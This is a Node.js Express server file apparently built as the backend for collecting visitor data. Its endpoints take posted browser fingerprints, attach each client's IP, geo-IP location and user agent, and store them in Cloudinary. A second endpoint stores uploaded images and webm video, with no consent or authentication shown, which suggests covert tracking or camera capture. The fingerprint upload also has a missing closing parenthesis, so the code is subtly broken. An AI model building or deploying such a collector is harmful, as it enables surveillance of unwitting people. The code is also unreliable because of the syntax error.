require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const cloudinary = require('cloudinary').v2;
const geoip = require('geoip-lite');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

// Validate required environment variables
const requiredEnvVars = [
  'CLOUDINARY_CLOUD_NAME',
  'CLOUDINARY_API_KEY',
  'CLOUDINARY_API_SECRET'
];

const missingVars = requiredEnvVars.filter(v => !process.env[v]);
if (missingVars.length > 0) {
  console.error('Missing required environment variables:', missingVars);
  process.exit(1);
}

// Configure Cloudinary with enhanced error handling
function configureCloudinary() {
  try {
    cloudinary.config({
      cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
      api_key: process.env.CLOUDINARY_API_KEY,
      api_secret: process.env.CLOUDINARY_API_SECRET,
      secure: true,
      timeout: 10000 // 10 second timeout
    });
    console.log('Cloudinary configured successfully');
    return cloudinary;
  } catch (error) {
    console.error('Cloudinary configuration failed:', error);
    process.exit(1);
  }
}

// Test Cloudinary connection
async function testCloudinaryConnection(cloudinary) {
  try {
    console.log('Testing Cloudinary connection...');
    const testResult = await cloudinary.uploader.upload(
      'data:application/json;base64,eyJ0ZXN0Ijoic3VjY2VzcyJ9',
      {
        folder: 'connection_tests',
        resource_type: 'raw',
        overwrite: false
      }
    );
    console.log('Cloudinary connection test successful:', testResult.secure_url);
    return true;
  } catch (error) {
    console.error('Cloudinary connection test failed:', {
      message: error.message,
      stack: error.stack
    });
    process.exit(1);
  }
}

// Initialize Express application
async function initializeApp() {
  const app = express();
  
  // Enhanced security middleware
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"],
        connectSrc: [
          "'self'", 
          "https://api.ipify.org",
          `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`,
          "https://res.cloudinary.com"
        ],
        imgSrc: ["'self'", "data:", "https://res.cloudinary.com"],
        mediaSrc: ["'self'", "data:", "blob:"],
        frameSrc: ["'self'"],
        fontSrc: ["'self'", "data:"]
      }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
  }));

  // Rate limiting
  app.use(rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later'
  }));

  // Body parsing middleware with size limit
  app.use(express.json({
    limit: '10mb',
    verify: (req, res, buf, encoding) => {
      try {
        JSON.parse(buf);
      } catch (e) {
        res.status(400).json({ error: 'Invalid JSON' });
        throw new Error('Invalid JSON');
      }
    }
  }));

  app.use(express.static('public'));

  // CORS configuration
  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    next();
  });

  // Utility functions
  function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
  }

  function getClientInfo(req) {
    const ip = getClientIp(req);
    const geo = geoip.lookup(ip);
    
    return {
      ip,
      geo: geo ? {
        country: geo.country,
        city: geo.city,
        region: geo.region
      } : null,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString()
    };
  }

  function generateHash(data) {
    return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
  }

  // Health check endpoint
  app.get('/', (req, res) => {
    res.json({
      status: 'active',
      message: 'Device Test Server Running',
      timestamp: new Date().toISOString(),
      version: '1.0.0'
    });
  });

  // IP detection endpoint
  app.get('/get-ip', (req, res) => {
    const ip = getClientIp(req);
    res.json({ ip });
  });

  // Fingerprint collection endpoint
  app.post('/collect-fingerprint', async (req, res) => {
    try {
      console.log('Incoming fingerprint request from:', getClientIp(req));
      
      if (!req.body || typeof req.body !== 'object') {
        console.error('Invalid request body:', req.body);
        return res.status(400).json({ error: 'Invalid request data' });
      }

      // Validate required fields
      if (!req.body.data || !req.body.timestamp) {
        return res.status(400).json({ 
          error: 'Missing required fields',
          required: ['data', 'timestamp']
        });
      }

      const clientInfo = getClientInfo(req);
      const fingerprintHash = generateHash(req.body.data);
      
      console.log('Processing fingerprint data from:', clientInfo.ip);
      
      // Upload to Cloudinary with timeout
      const uploadResult = await Promise.race([
        cloudinary.uploader.upload(
          `data:application/json;base64,${Buffer.from(JSON.stringify({
            ...clientInfo,
            ...req.body.data,
            fingerprintHash
          })).toString('base64')}`,
          {
            folder: 'fingerprints',
            resource_type: 'raw',
            format: 'json',
            overwrite: false,
            unique_filename: true,
            timeout: 10000
          }
        ),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Upload timeout')), 10000)
      ]);

      console.log('Fingerprint saved successfully:', uploadResult.secure_url);
      
      res.json({ 
        success: true, 
        url: uploadResult.secure_url,
        hash: fingerprintHash
      });

    } catch (error) {
      console.error('Fingerprint collection error:', {
        message: error.message,
        stack: error.stack,
        body: req.body ? JSON.stringify(req.body).length : 'empty'
      });
      
      res.status(500).json({ 
        error: 'Failed to save fingerprint',
        details: process.env.NODE_ENV === 'development' ? error.message : null
      });
    }
  });

  // Media collection endpoint
  app.post('/collect-media', async (req, res) => {
    try {
      const { data, metadata } = req.body;
      
      if (!data || !metadata || !metadata.media_type) {
        return res.status(400).json({ 
          error: 'Invalid media data',
          required: ['data', 'metadata.media_type']
        });
      }

      const clientInfo = getClientInfo(req);
      const resourceType = metadata.media_type === 'image' ? 'image' : 'video';
      
      console.log('Processing media upload from:', clientInfo.ip);
      
      const uploadResult = await cloudinary.uploader.upload(
        `data:${resourceType === 'image' ? 'image/jpeg' : 'video/webm'};base64,${data}`, 
        {
          folder: 'media',
          resource_type: resourceType,
          overwrite: false,
          unique_filename: true,
          timeout: 15000
        }
      );

      console.log('Media saved successfully:', uploadResult.secure_url);
      
      res.json({ 
        success: true, 
        url: uploadResult.secure_url,
        public_id: uploadResult.public_id
      });
    } catch (error) {
      console.error('Media upload error:', error);
      res.status(500).json({ 
        error: 'Failed to save media',
        details: process.env.NODE_ENV === 'development' ? error.message : null
      });
    }
  });

  // 404 handler
  app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
  });

  // Error handler
  app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  });

  return app;
}

// Application startup sequence
async function startApplication() {
  try {
    // 1. Configure Cloudinary
    const cloudinaryInstance = configureCloudinary();
    
    // 2. Test Cloudinary connection
    await testCloudinaryConnection(cloudinaryInstance);
    
    // 3. Initialize Express app
    const app = await initializeApp();
    
    // 4. Start server
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
      console.log(`Server running on port ${PORT}`);
      console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    });
  } catch (error) {
    console.error('Application startup failed:', error);
    process.exit(1);
  }
}

// Start the application
startApplication();
